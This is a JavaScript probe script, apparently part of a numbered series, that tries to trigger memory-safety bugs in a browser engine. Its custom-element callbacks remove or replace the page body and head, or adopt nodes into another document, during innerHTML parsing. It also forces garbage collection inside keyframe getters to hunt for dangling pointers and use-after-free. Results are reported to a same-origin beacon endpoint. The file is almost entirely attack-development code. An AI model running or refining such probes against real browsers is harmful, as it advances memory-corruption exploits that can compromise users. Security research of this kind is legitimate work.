// p133 — HTMLElementStack raw pointer dangling via CE callbacks
// p132 proved: connectedCallback fires BETWEEN CE constructions during innerHTML
// p132 R5: first-connected fires BEFORE second-ctor
//
// Target: HTMLElementStack.h:156-158 — raw Element* m_headElement, m_bodyElement
// These are NOT ref-counted shortcuts (unlike HTMLStackItem which uses RefPtr)
// If a CE callback removes the <head> or <body> element, these pointers dangle
//
// Also: KeyframeEffect unrooted rawValue (V7 from DS V4 Pro)
//
// Beacon prefix: V133P-
(function(){
var rid='v133p'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V133P-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V133P-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe133-start');

// ======== P1: connectedCallback removes <body> during innerHTML ========
// innerHTML parses <body-kill-p1> → connectedCallback fires →
// removes document.body → parser's m_bodyElement is now dangling →
// parser continues constructing more elements → uses stale m_bodyElement
function testP1(){
  var r={};
  try{
    var callbackFired=false;
    var bodyRemoved=false;

    class BodyRemover extends HTMLElement {
      connectedCallback(){
        callbackFired=true;
        if(document.body){
          try{
            document.body.remove();
            bodyRemoved=true;
          }catch(e){
            r.removeErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
          }
        }
      }
    }
    customElements.define('bodyrem-p1',BodyRemover);

    // Build HTML that constructs our CE then MORE elements after it
    // The parser caches m_bodyElement, our callback removes it,
    // then the parser tries to append remaining elements to the stale body
    var html='<bodyrem-p1></bodyrem-p1><div id="after1">test1</div><p id="after2">test2</p><span>test3</span>';

    var container=document.createElement('div');
    if(document.body){
      document.body.appendChild(container);
    }else{
      document.documentElement.appendChild(container);
    }

    try{
      container.innerHTML=html;
      r.innerHTMLOK=true;
      r.containerChildren=container.childNodes.length;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }

    r.callbackFired=callbackFired;
    r.bodyRemoved=bodyRemoved;
    r.bodyExists=!!document.body;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== P2: connectedCallback removes <head> ========
function testP2(){
  var r={};
  try{
    var callbackFired=false;
    var headRemoved=false;

    class HeadRemover extends HTMLElement {
      connectedCallback(){
        callbackFired=true;
        if(document.head){
          try{
            document.head.remove();
            headRemoved=true;
          }catch(e){
            r.removeErr=e.constructor.name;
          }
        }
      }
    }
    customElements.define('headrem-p2',HeadRemover);

    var container=document.createElement('div');
    document.documentElement.appendChild(container);
    try{
      container.innerHTML='<headrem-p2></headrem-p2><div>afterhead</div>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.callbackFired=callbackFired;
    r.headRemoved=headRemoved;
    r.headExists=!!document.head;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== P3: connectedCallback replaces body with new one ========
// Remove body, create new body, append to documentElement
// Parser's m_bodyElement points to OLD body (freed)
// New body is a different object
function testP3(){
  var r={};
  try{
    var oldBody=document.body;
    var newBodyCreated=false;

    class BodyReplacer extends HTMLElement {
      connectedCallback(){
        try{
          if(document.body){
            var newBody=document.createElement('body');
            newBody.id='newbody';
            document.body.remove();
            document.documentElement.appendChild(newBody);
            newBodyCreated=true;
          }
        }catch(e){
          r.replaceErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
      }
    }
    customElements.define('bodyrep-p3',BodyReplacer);

    var container=document.createElement('div');
    if(document.body) document.body.appendChild(container);
    else document.documentElement.appendChild(container);

    try{
      container.innerHTML='<bodyrep-p3></bodyrep-p3><div id="postswap">after</div>';
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }

    r.newBodyCreated=newBodyCreated;
    r.currentBodyId=document.body?document.body.id:'null';
    r.sameBody=(document.body===oldBody);
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== P4: KeyframeEffect unrooted rawValue (V7) ========
// processKeyframeLikeObject: rawValue from get() is unrooted JSValue
// convert<IDLSequence<IDLDOMString>> iterates+toString → GC can fire
// Proxy-wrapped getter returns fresh array, toString triggers GC
function testP4(){
  var r={};
  try{
    var el=document.createElement('div');
    document.documentElement.appendChild(el);

    // Create keyframe-like object with Proxy getter
    var getterCallCount=0;
    var toStringCallCount=0;

    var keyframes=new Proxy({},{
      get:function(target,prop){
        if(prop==='length') return 2;
        if(prop==='0'||prop==='1'){
          getterCallCount++;
          return new Proxy({offset:prop==='0'?0:1, opacity:'1'},{
            get:function(t,p){
              if(p==='offset') return t.offset;
              if(p==='opacity') return t.opacity;
              if(p===Symbol.iterator) return undefined;
              return undefined;
            }
          });
        }
        if(prop===Symbol.iterator){
          return function*(){
            yield {offset:0,opacity:'0'};
            yield {offset:1,opacity:'1'};
          };
        }
        return undefined;
      }
    });

    try{
      var anim=el.animate(keyframes,{duration:100});
      r.animOK=true;
      r.animState=anim.playState;
      anim.cancel();
    }catch(e){
      r.animErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }

    // Now with GC-triggering toString
    var gcKeyframes=[
      {
        offset:0,
        get opacity(){
          // Trigger GC during property access
          var garbage=[];
          for(var i=0;i<500;i++) garbage.push(new ArrayBuffer(16384));
          garbage=null;
          return '0';
        }
      },
      {
        offset:1,
        get opacity(){
          var garbage=[];
          for(var i=0;i<500;i++) garbage.push(new ArrayBuffer(16384));
          garbage=null;
          return '1';
        }
      }
    ];

    try{
      var anim2=el.animate(gcKeyframes,{duration:100});
      r.gcAnimOK=true;
      anim2.cancel();
    }catch(e){
      r.gcAnimErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }

    r.getterCalls=getterCallCount;
    el.remove();
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== P5: adoptNode in connectedCallback — move during tree insertion ========
function testP5(){
  var r={};
  try{
    var newDoc=(new DOMParser()).parseFromString('<html><body></body></html>','text/html');
    var adopted=false;
    var disconnected=false;

    class AdoptOnConnect extends HTMLElement {
      connectedCallback(){
        try{
          newDoc.adoptNode(this);
          adopted=true;
        }catch(e){
          r.adoptErr=e.constructor.name+':'+String(e.message||'').slice(0,60);
        }
      }
      disconnectedCallback(){
        disconnected=true;
      }
    }
    customElements.define('adoptconn-p5',AdoptOnConnect);

    var container=document.createElement('div');
    document.documentElement.appendChild(container);
    try{
      container.innerHTML='<adoptconn-p5></adoptconn-p5><div>after-adopt</div>';
      r.innerHTMLOK=true;
      r.containerChildren=container.childNodes.length;
      r.newDocBodyChildren=newDoc.body?newDoc.body.childNodes.length:-1;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.adopted=adopted;
    r.disconnected=disconnected;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== P6: Stress — many CEs with body manipulation in callbacks ========
function testP6(){
  var r={};
  try{
    var callCount=0;
    var errors=[];

    class StressCE extends HTMLElement {
      connectedCallback(){
        callCount++;
        try{
          // Append child to document.body from inside callback
          if(document.body){
            var div=document.createElement('div');
            div.textContent='stress'+callCount;
            document.body.appendChild(div);
          }
        }catch(e){
          errors.push(callCount+':'+e.constructor.name);
        }
      }
    }
    customElements.define('stress-p6',StressCE);

    var container=document.createElement('div');
    document.documentElement.appendChild(container);

    // Many CEs in one innerHTML
    var html='';
    for(var i=0;i<50;i++){
      html+='<stress-p6></stress-p6>';
    }
    try{
      container.innerHTML=html;
      r.innerHTMLOK=true;
    }catch(e){
      r.innerHTMLErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
    }
    r.callCount=callCount;
    r.errors=errors.slice(0,5);
    r.containerChildren=container.childNodes.length;
  }catch(e){
    r.err=e.constructor.name+':'+String(e.message||'').slice(0,80);
  }
  return r;
}

// ======== Run all ========
async function runAll(){
  var tests=[
    {name:'P1-BODY-REMOVE',fn:testP1},
    {name:'P2-HEAD-REMOVE',fn:testP2},
    {name:'P3-BODY-REPLACE',fn:testP3},
    {name:'P4-KEYFRAME-UAF',fn:testP4},
    {name:'P5-ADOPT-CONNECT',fn:testP5},
    {name:'P6-STRESS-50',fn:testP6}
  ];
  for(var t=0;t<tests.length;t++){
    beacon(tests[t].name+'-PRE','starting');
    try{
      var result=tests[t].fn();
      beacon(tests[t].name,result||{});
    }catch(e){
      beacon(tests[t].name,{fatal:e.constructor.name+':'+String(e.message||'').slice(0,80)});
    }
    await new Promise(function(resolve){setTimeout(resolve,500);});
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
